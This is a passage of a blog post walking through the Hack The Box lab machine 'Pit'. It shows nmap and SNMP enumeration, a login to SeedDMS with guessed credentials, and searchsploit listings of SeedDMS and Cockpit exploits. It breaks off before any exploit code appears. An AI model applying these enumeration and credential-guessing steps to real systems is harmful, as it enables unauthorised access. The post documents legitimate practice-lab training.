<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	15 May 2021IP:	10.10.10.241">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[pit]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/05/22/pit/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	15 May 2021IP:	10.10.10.241">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1981.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1982.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1983.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1984.jpg">
<meta property="article:published_time" content="2021-05-21T16:10:18.000Z">
<meta property="article:modified_time" content="2021-09-25T18:50:13.584Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1981.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/05/22/pit/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/05/22/pit/","path":"2021/05/22/pit/","title":"Hack-The-Box-walkthrough[pit]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[pit] | lUc1f3r11's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="lUc1f3r11's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">lUc1f3r11's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">205</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">4.</span> <span class="nav-text">Privilege Escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cleanup-Script"><span class="nav-number">5.</span> <span class="nav-text">Cleanup Script</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">6.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">7.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">205</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/05/22/pit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="lUc1f3r11">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[pit] | lUc1f3r11's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[pit]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-05-22 00:10:18" itemprop="dateCreated datePublished" datetime="2021-05-22T00:10:18+08:00">2021-05-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-09-26 02:50:13" itemprop="dateModified" datetime="2021-09-26T02:50:13+08:00">2021-09-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>4.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>18 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	15 May 2021<br>IP:	10.10.10.241</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1981.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.241</span></span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">80/tcp   open  http            nginx 1.14.1</span><br><span class="line">9090/tcp open  ssl/zeus-admin?</span><br></pre></td></tr></table></figure>

<p>Initial Nmap scan reveals the machine is running SSH and HTTP&#x2F;s service. Port 9090 is<br>HTTPS, the TLS certificate discloses hostname. Let’s add hostname to hosts file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.241 pit.htb dms-pit.htb</span><br></pre></td></tr></table></figure>

<p>The HTB tweet gives us a small hint about the box. “Walk”, as in SNMP.</p>
<p>Let’s do a quick UDP ping and find whether SNMP port is open or closed.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># nping --udp -c 2 -p 161 pit.htb</span></span><br><span class="line"></span><br><span class="line">Starting Nping 0.7.91 ( https://nmap.org/nping ) at 2021-05-21 12:27 EDT</span><br><span class="line">SENT (0.0718s) UDP 10.10.14.18:53 &gt; 10.10.10.241:161 ttl=64 <span class="built_in">id</span>=30254 iplen=28 </span><br><span class="line">SENT (1.0721s) UDP 10.10.14.18:53 &gt; 10.10.10.241:161 ttl=64 <span class="built_in">id</span>=30254 iplen=28 </span><br><span class="line"> </span><br><span class="line">Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A</span><br><span class="line">Raw packets sent: 2 (56B) | Rcvd: 0 (0B) | Lost: 2 (100.00%)</span><br><span class="line">Nping <span class="keyword">done</span>: 1 IP address pinged <span class="keyword">in</span> 2.11 seconds</span><br></pre></td></tr></table></figure>

<p>As you can see we can able to send UDP packets to SNMP port. It is open, we can confirm by<br>running NMAP scan on the port.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># nmap -sU -p161,162 -sV pit.htb</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 12:28 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> pit.htb (10.10.10.241)</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE    SERVICE  VERSION</span><br><span class="line">161/udp open     snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp filtered snmptrap</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.63 seconds</span><br></pre></td></tr></table></figure>

<p>As you can see we got the version information of SNMP and it also disclosed it is using ‘Public’<br>community string for authentication. Public community string is used as password to send<br>request to SNMP server to reveal information and it is default community string. Public string<br>has only read access, it cannot write to SNMP.</p>
<p>Let’s find what SNMP can disclose for us. We will use below perl script, as it can perform multi-<br>threading and parse usable information.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RoZWlsYW5kLXI3L3NubXA=">snmp<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>For NetAddr Error: <span class="exturl" data-url="aHR0cHM6Ly9tZXRhY3Bhbi5vcmcvcG9kL3JlbGVhc2UvTUlLRVIvTmV0QWRkci1JUC00LjA3OS9JUC5wbSNJTlNUQUxMQVRJT04=">https://metacpan.org/pod/release/MIKER/NetAddr-IP-4.079/IP.pm#INSTALLATION<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># perl snmpbw.pl pit.htb public 2 1                                                                                                         </span></span><br><span class="line">SNMP query:       10.10.10.241</span><br><span class="line">Queue count:      0</span><br><span class="line">SNMP SUCCESS:     10.10.10.241</span><br></pre></td></tr></table></figure>

<p>If you have multiple IPs to scan give a text file and increase the thread size from 1 to 8 or 16 or<br>32. Upon completion it generates a file (named as IP of target) with all the information it has<br>collected.</p>
<p>Let’s read useful information from the result.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># head 10.10.10.241.snmp</span></span><br><span class="line">.1.3.6.1.2.1.1.1.0 = STRING: Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="comment">#1 SMP Thu Apr 8</span></span><br><span class="line">19:01:30 UTC 2021 x86_64</span><br><span class="line">.1.3.6.1.2.1.1.2.0 = OID: .1.3.6.1.4.1.8072.3.2.10</span><br><span class="line">.1.3.6.1.2.1.1.3.0 = Timeticks: (6114324) 16:59:03.24</span><br><span class="line">.1.3.6.1.2.1.1.4.0 = STRING: Root &lt;root@localhost&gt; (configure /etc/snmp/snmp.local.conf)</span><br><span class="line">.1.3.6.1.2.1.1.5.0 = STRING: pit.htb</span><br><span class="line">.1.3.6.1.2.1.1.6.0 = STRING: Unknown (edit /etc/snmp/snmpd.conf)</span><br><span class="line">-----SNIP--------</span><br><span class="line">.1.3.6.1.4.1.2021.9.1.2.2 = STRING: /var/www/html/seeddms51x/seeddms</span><br><span class="line">.1.3.6.1.4.1.2021.9.1.3.1 = STRING: /dev/mapper/cl-root</span><br><span class="line">.1.3.6.1.4.1.2021.9.1.3.2 = STRING: /dev/mapper/cl-seeddms</span><br><span class="line">-----SNIP--------</span><br><span class="line">.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: /usr/</span><br><span class="line">bin/monitor</span><br><span class="line">-----SNIP--------</span><br><span class="line">Database status</span><br><span class="line">OK - Connection to database successful.</span><br><span class="line">System release info</span><br><span class="line">CentOS Linux release 8.3.2011</span><br><span class="line">SELinux Settings</span><br><span class="line">user</span><br><span class="line">-----SNIP--------</span><br><span class="line">Login Name SELinux User MLS/MCS Range Service</span><br><span class="line">__default__ unconfined_u s0-s0:c0.c1023 *</span><br><span class="line">michelle user_u s0 *</span><br><span class="line">root unconfined_u s0-s0:c0.c1023 *</span><br><span class="line">System <span class="built_in">uptime</span></span><br><span class="line">09:59:08 up 17:00, 2 <span class="built_in">users</span>, load average: 0.00, 0.00, 0.00</span><br><span class="line">-----SNIP--------</span><br></pre></td></tr></table></figure>

<p>We got Linux Kernel version, web directory, OS version, username and binary location. These<br>information will be useful in further steps.</p>
<p>Let’s access HTTPS service.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://10.10.10.241:9090/</span><br></pre></td></tr></table></figure>

<p>If we read the page source, the we’d find that this is a ”cockpit web console”, it allows admin&#x2F;<br>users to perfrom limited&#x2F;Administrative tasks on server.</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>Let’s do a quick exploit search.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># searchsploit &quot;cockpit&quot;</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                              |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Cockpit CMS 0.4.4 &lt; 0.5.5 - Server-Side Request Forgery                                                     | php/webapps/44567.txt</span><br><span class="line">Cockpit CMS 0.6.1 - Remote Code Execution                                                                   | php/webapps/49390.txt</span><br><span class="line">Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)                                         | multiple/webapps/49397.txt</span><br><span class="line">openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                                                          | php/webapps/47305.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>I tried SSRF for version 234 and it is not useful in our situation.<br>Let’s check the other HTTP server.</p>
<p>It is forbidden for us to access. Perhaps there’s a different directory which we can access. I ran<br>GoBuster and found out nothing.<br>Code Execution<br>In SNMP dump, we saw something related to DMS.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.1.3.6.1.4.1.2021.9.1.2.2 = STRING: /var/www/html/seeddms51x/seeddms</span><br></pre></td></tr></table></figure>

<p>Upon quick google, we find that “SeedDMS” is an open-source document management system.<br>Let’s try to append the directory name in web address bar and access.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F</span><br></pre></td></tr></table></figure>

<p>We get this login page. If we try to login via common credentials then it fails. But, if we try the<br>username which we found via SNMP enumeration then it would work.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">michelle/michelle</span><br></pre></td></tr></table></figure>

<p>Once we login, we’d see a note from administrator saying that they have upgraded the software<br>to 5.1.15 from 5.1.10.</p>
<p>Let’s do quick search for an exploit to this version.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># searchsploit &quot;seeddms&quot;</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                              |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                            | php/webapps/48324.txt</span><br><span class="line">SeedDMS &lt; 5.1.11 - <span class="string">&#x27;out.GroupMgr.php&#x27;</span> Cross-Site Scripting                                                  | php/webapps/47024.txt</span><br><span class="line">SeedDMS &lt; 5.1.11 - <span class="string">&#x27;out.UsrMgr.php&#x27;</span> Cross-Site Scripting                                                    | php/webapps/47023.txt</span><br><span class="line">SeedDMS versions &lt; 5.1.11 - Remote Command Execution                                                        | php/webapps/47022.txt</span><br><span class="line">------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>There’s no any exploit is available to 5.1.15 version. I tried 5.1.18 XSS but it didn’t work. But for<br>some reason the RCE for version 5.1.11 works.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># cat 